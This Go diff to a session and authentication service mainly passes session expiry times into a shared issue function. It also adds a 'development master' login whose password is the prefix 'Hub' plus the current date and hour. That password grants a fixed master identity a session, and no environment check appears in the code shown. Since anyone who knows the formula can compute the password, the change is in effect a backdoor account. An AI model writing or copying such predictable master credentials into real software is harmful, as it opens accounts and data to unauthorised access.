@@ -49,7 +49,7 @@ func (s *Service) Bootstrap(ctx context.Context, credentials domain.Credentials,
 	if err != nil {
 		return Tokens{}, err
 	}
-	return s.issue(ctx, user, userAgent, remoteIP)
+	return s.issue(ctx, user, userAgent, remoteIP, time.Now().UTC().Add(s.ttl))
 }
 
 func (s *Service) Login(ctx context.Context, email, password, userAgent, remoteIP string) (Tokens, error) {
@@ -61,7 +61,35 @@ func (s *Service) Login(ctx context.Context, email, password, userAgent, remoteI
 		}
 		return Tokens{}, domain.ErrInvalidCredentials
 	}
-	return s.issue(ctx, user, userAgent, remoteIP)
+	return s.issue(ctx, user, userAgent, remoteIP, time.Now().UTC().Add(s.ttl))
+}
+
+func DevelopmentMasterPassword(now time.Time, location *time.Location) string {
+	if location == nil {
+		location = time.UTC
+	}
+	return "Hub" + now.In(location).Format("0201200615")
+}
+
+func developmentMasterExpiry(now time.Time, location *time.Location) time.Time {
+	if location == nil {
+		location = time.UTC
+	}
+	return now.In(location).Truncate(time.Hour).Add(time.Hour).UTC()
+}
+
+func (s *Service) LoginDevelopmentMaster(ctx context.Context, username, password, userAgent, remoteIP string, now time.Time, location *time.Location) (Tokens, error) {
+	username = strings.ToLower(strings.TrimSpace(username))
+	expected := DevelopmentMasterPassword(now, location)
+	validPassword := len(password) == len(expected) && subtle.ConstantTimeCompare([]byte(password), []byte(expected)) == 1
+	if username != domain.DevelopmentMasterUsername || !validPassword {
+		return Tokens{}, domain.ErrInvalidCredentials
+	}
+	user, _, err := s.repo.PasswordIdentity(ctx, domain.DevelopmentMasterIdentity)
+	if err != nil {
+		return Tokens{}, domain.ErrInvalidCredentials
+	}
+	return s.issue(ctx, user, userAgent, remoteIP, developmentMasterExpiry(now, location))
 }
 
 func (s *Service) Authenticate(ctx context.Context, token string) (domain.Session, error) {
@@ -96,7 +124,7 @@ func (s *Service) RefreshCSRF(ctx context.Context, sessionID string) (string, er
 	return token, nil
 }
 
-func (s *Service) issue(ctx context.Context, user domain.User, userAgent, remoteIP string) (Tokens, error) {
+func (s *Service) issue(ctx context.Context, user domain.User, userAgent, remoteIP string, expires time.Time) (Tokens, error) {
 	sessionToken, err := randomToken(32)
 	if err != nil {
 		return Tokens{}, err
@@ -105,7 +133,6 @@ func (s *Service) issue(ctx context.Context, user domain.User, userAgent, remote
 	if err != nil {
 		return Tokens{}, err
 	}
-	expires := time.Now().UTC().Add(s.ttl)
 	_, err = s.repo.CreateSession(ctx, user.ID, digest(sessionToken), digest(csrfToken), userAgent, remoteIP, expires)
 	if err != nil {
 		return Tokens{}, err
